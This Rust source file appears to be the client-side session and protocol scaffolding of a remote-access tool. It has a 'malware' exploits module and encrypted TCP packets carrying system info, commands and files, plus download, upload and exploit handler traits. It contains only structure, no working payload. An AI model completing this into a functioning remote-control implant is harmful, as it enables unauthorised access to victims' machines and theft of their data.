use std::net::TcpStream;

use crate::{
    malware::Exploits,
    structure::{
        enums::Packet,
        structs::define::StructStone,
        traits::define::Detector,
    },
    utility::secure::{
        crypto::Crypto,
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};

pub trait PacketProcessing {
    fn take_packet<T>(&self) -> T;

    fn get_packet<T>(&self) -> T;

    fn set_packet<T>(&mut self, packet: T) -> T;
}

pub struct Session {
    use_encryption: bool,
    socket: TcpStream,
    packet: Packet,
    aes_cipher: AesGcmSivCrypto,
    rsa_cipher: RsaCrypto,
}

pub struct Client {
    pub session: Session,
    pub exploits: Exploits,
}

pub struct ProtocolEditor {
    session: Session,
    exploits: Exploits,
}


impl Session {
    pub fn take_packet(&self) -> &Packet {
        &self.packet
    }
    pub fn get_packet(&self) -> Packet {
        self.packet.clone()
    }
    pub fn set_packet(&mut self, packet: Packet) {
        self.packet = packet
    }
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(use_encryption: bool, socket: TcpStream, packet: Packet) -> Session {
        match &packet {
            Packet::StructStone { .. } |
            Packet::SecureHandshakePacket { .. } |
            Packet::SecurePacket { .. }
            => {
                Session { use_encryption, socket, packet, aes_cipher: AesGcmSivCrypto::new(), rsa_cipher: RsaCrypto::new() }
            }
        }
    }
    pub fn set_encryption(&mut self, use_encryption: bool) {
        self.use_encryption = use_encryption
    }
    pub fn is_encryption(&self) -> bool {
        self.use_encryption
    }
}


impl Client {
    pub fn set_packet(&mut self, packet: Packet) {
        self.session.set_packet(packet)
    }

    pub fn take_sysinfo(&self) -> &Vec<u8> { self.session.take_packet().take_sysinfo() }

    pub fn take_command(&self) -> &Vec<u8> {
        self.session.take_packet().take_command()
    }

    pub fn take_response(&self) -> &Vec<u8> {
        self.session.take_packet().take_response()
    }

    pub fn take_file(&self) -> &Vec<u8> {
        self.session.take_packet().take_file()
    }

    pub fn get_sysinfo(&self) -> Vec<u8> { self.session.take_packet().get_sysinfo() }

    pub fn get_command(&self) -> Vec<u8> {
        self.session.take_packet().get_command()
    }

    pub fn get_response(&self) -> Vec<u8> {
        self.session.take_packet().get_response()
    }

    pub fn get_file(&self) -> Vec<u8> {
        self.session.take_packet().get_file()
    }
    pub fn use_encrypt(&mut self, use_encryption: bool) {
        self.session.aes_cipher.setup().expect("self.session.aes_cipher.setup()");
        self.session.rsa_cipher.setup().expect("self.session.rsa_cipher.setup()");
        self.session.set_encryption(use_encryption)
    }
}

pub trait HandleSession {
    fn encryption(&mut self) -> std::io::Result<()>;
    fn decryption(&mut self) -> std::io::Result<()>;
    fn send(&mut self) -> Result<&StructStone, &StructStone>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> StructStone;
}

pub trait HandleProtocols {
    fn response(&mut self, msg: &str) -> Result<&StructStone, &StructStone>;
    fn disconnect(&mut self);
    fn download(&mut self) -> Result<&StructStone, &StructStone>;
    fn upload(&mut self) -> Result<&StructStone, &StructStone>;
    fn exploit(&mut self) -> Result<&StructStone, &StructStone>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}